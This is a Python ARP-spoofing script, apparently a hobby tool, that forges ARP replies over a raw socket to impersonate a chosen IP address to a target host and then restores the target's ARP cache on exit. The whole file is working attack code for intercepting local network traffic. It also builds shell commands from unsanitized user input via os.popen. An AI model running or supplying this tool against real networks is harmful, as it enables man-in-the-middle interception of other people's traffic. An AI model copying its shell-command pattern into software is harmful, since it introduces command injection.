#made by rusty-s3c/cesar
#made for fun


try:
    import time, os, socket, argparse, sys, random
    from termcolor import colored

except:
    print("Make sure you have these libraries/packages installed:\nargparse, termcolor\n")
    exit()
if(os.getuid()!=0):
    print(colored("[!]", "red"), colored("Error: you must be a root user to run this program. Exiting...", "yellow"))
    exit() #os library is imported when the program can get to this if statement, so it can check if the user is root, needed for creating sockets
def initialize():
    print(colored("An ARP spoofer made for devices running a GNU/Linux distro, written in Python.\n", "red"))
    print(colored("Made by:", "yellow"))
    print(colored("rusty-s3c/cesar", "green"))

    parser = argparse.ArgumentParser(description="An ARP Spoofer written in Python.")
    parser.add_argument("-i", dest="intf", metavar="interface", type=str, help="The interface to perform the attack on.")
    parser.add_argument("-t", dest="t", metavar="Target IP address", type=str, help="Your target its IP Address.")
    parser.add_argument("-a", dest="act_ip", metavar="IP address to act as", type=str, help="The IP address to act as.")
    parse = parser.parse_args()
    interface = parse.intf
    ip = parse.act_ip
    target_ip = parse.t
    if(len(sys.argv)<4):
        parser.print_help()
        exit()
    create_packet(interface, ip, target_ip)

def send_packet(interface, tip, packet):
#will also create the rearping packet here, idk why I put it here lol
    own_ip=temp_num=temp_hex=ip_hex=""
    rearp_packet = packet
    dot_count=count=0
    ip_list=[]
    rearp_packetlist=[]
    own_ip = os.popen("hostname -I").read()
    own_ip = own_ip.replace("\n", "")
    own_ip = own_ip.replace(" ", "")
    for i in range(0, len(str(own_ip))):

        if(own_ip[i]=="."):
            dot_count+=1
            if(dot_count<3):
                ip_list.append(own_ip[count:i])
                i = i+1
                count=i
            else:
                ip_list.append(own_ip[count:i])
                ip_list.append(own_ip[i+1:len(str(own_ip))+1])
    for i in ip_list:
        try:
            temp_num = int(i)
            temp_hex = "0x%03X" % temp_num
            ip_hex+=temp_hex[3:]
        except: #we now know the user has multiple hostnames(multiple connections)
            print(colored("[!]", "red"), colored("Please make sure the only connection opened is to the network you are attacking. Exiting...", "yellow"))
            exit()

    for i in rearp_packet:
       rearp_packetlist.append(i)
    for i in range(56, 64):
        rearp_packetlist[i]=ip_hex[i-56]
    rearp_packet=""
    for i in range(0, len(rearp_packetlist)):
       rearp_packet+=rearp_packetlist[i]

    print(colored("[*]", "green"), colored("Attack on IP", "yellow"), colored(tip, "red"), colored(" started...", "yellow"))
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((interface, 0))
    while True:
        try:
            s.send(bytearray.fromhex(packet))
            time.sleep(1) #don't really want to spam the target with packets
        except:
            s.close()
            print(colored("\n[!]", "red"), colored("Exception. Re-ARPing target and exiting...", "yellow"))
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW) #create a new socket because one of the exceptions could be a socket error and the connection being closed
            s.bind((interface, 0))
            for i in range(5): #loop 5 times so the target update its arp cache for sure
                s.send(bytearray.fromhex(rearp_packet))
                time.sleep(5)
            return False






def create_packet(interface, ip, target_ip): #the function used for creating the arp packet
    #before it continues, it must get the target mac address
    print(colored("[*]", "yellow"), colored("Creating ARP spoofing packet...", "green"))
    time.sleep(1) #sleep so the user has time to read the notification
    bytes_list = []
    arp_packet=packet=temp_hex=ip_hex=temp_arp=own_mac=target_mac=tip_hex=""
    temp_num=count=dot_count=0
    ip_list = [] #the list for getting the ip address parts (of the user) and converting them to hexadecimal
    tip_list = [] #the list for getting the ip address parts (of the target) and converting them
    mac_cmd = os.popen("arping -c 1 "+" -I"+interface+" "+target_ip).read()
    for i in range(0, len(mac_cmd)):
        if(mac_cmd[i]=="["):
            for x in range(i+1, i+18):
                if(mac_cmd[x]!=":"):
                    target_mac+=mac_cmd[x]
    

    hex_values = "0123456789abcdef" #the values fneeded to convert the values to hexadecimal
    get_mac = "/sys/class/net/"+interface+"/address"
    get_mac = os.popen("cat "+get_mac).read()
    get_mac = str(get_mac)
    for i in range(0, len(str(get_mac))):
        if(get_mac[i]!=":"):
            own_mac+=get_mac[i]

    for i in range(0, len(str(ip))):

        if(ip[i]=="."):
            dot_count+=1
            if(dot_count<3):
                ip_list.append(ip[count:i])
                i = i+1
                count=i
            else:
                ip_list.append(ip[count:i])
                ip_list.append(ip[i+1:len(str(ip))+1])
    dot_count=0
    count=0
    for i in range(0, len(str(target_ip))):

        if(target_ip[i]=="."):
            dot_count+=1
            if(dot_count<3):
                tip_list.append(target_ip[count:i])
                i = i+1
                count=i
            else:
                tip_list.append(target_ip[count:i])
                tip_list.append(target_ip[i+1:len(str(target_ip))+1])

    for i in ip_list:
        temp_num = int(i)
        temp_hex = "0x%03X" % temp_num
        ip_hex+=temp_hex[3:]

    for i in tip_list:

        temp_num = int(i)
        temp_hex = "0x%03X" % temp_num
        tip_hex+=temp_hex[3:]
    packet=target_mac+own_mac[:len(own_mac)-1]+"08060001080006040002"+own_mac[:len(own_mac)-1]+ip_hex+target_mac+tip_hex
    for i in range(0, len(packet)):
        if(packet[i]!="\n"):
            arp_packet+=packet[i]
        else:
            arp_packet+=packet[i+1]
            i+=1
    send_packet(interface, target_ip, arp_packet)

initialize()
